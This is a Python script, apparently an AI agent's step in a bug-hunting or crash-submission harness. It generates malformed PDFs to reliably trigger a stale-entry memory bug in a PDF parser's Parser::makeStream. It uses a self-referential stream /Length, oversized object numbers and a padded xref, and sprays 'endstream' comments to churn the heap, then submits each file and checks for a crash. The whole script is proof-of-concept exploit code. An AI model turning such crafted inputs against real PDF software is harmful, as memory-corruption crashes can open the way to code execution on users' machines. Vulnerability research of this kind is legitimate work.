# Try to make the Parser::makeStream stale-entry bug deterministic: high object number and heap churn before reconstruction.
from pathlib import Path

def make_len_missing_oldxref_high(objnum=1000, spray_endstreams=0):
    parts=[]
    def add(x):
        if isinstance(x,str): x=x.encode('latin1')
        parts.append(x)
    add('%PDF-1.4\n')
    for _ in range(spray_endstreams):
        add('% endstream\n')
    offsets={}
    for num, body in [
        (1, '<< /Type /Catalog /Pages 2 0 R >>'),
        (2, '<< /Type /Pages /Count 1 /Kids [3 0 R] >>'),
        (3, f'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents {objnum} 0 R >>'),
    ]:
        offsets[num]=sum(len(p) for p in parts); add(f'{num} 0 obj\n{body}\nendobj\n')
    offsets[objnum]=sum(len(p) for p in parts)
    add(f'{objnum} 0 obj\n<< /Length {objnum+1} 0 R >>\nstream\n')
    add('endstream\nendobj\n')
    xref_off=sum(len(p) for p in parts)
    size=objnum+1
    add(f'xref\n0 {size}\n')
    # output all entries; undefined entries as free
    for i in range(size):
        if i==0:
            add('0000000000 65535 f \n')
        elif i in offsets:
            add(f'{offsets[i]:010d} 00000 n \n')
        else:
            add('0000000000 00000 f \n')
    add(f'trailer\n<< /Size {size} /Root 1 0 R >>\nstartxref\n{xref_off}\n%%EOF\n')
    return b''.join(parts)

for objnum,spray in [(1000,0),(1000,80),(5000,0),(5000,80),(20000,80)]:
    p=make_len_missing_oldxref_high(objnum,spray)
    path=f'/tmp/poc_len_missing_high_{objnum}_{spray}.pdf'
    Path(path).write_bytes(p)
    print(path, 'size', len(p), 'xref', p.find(b'xref'))
    r=await self.submit(path)
    print(' ->', r.status, r.exit_code, 'sub', r.submission_number, 'outlen', len(r.output))
    if r.status!='no_crash' or r.exit_code!=0:
        print(r.output[:4000])
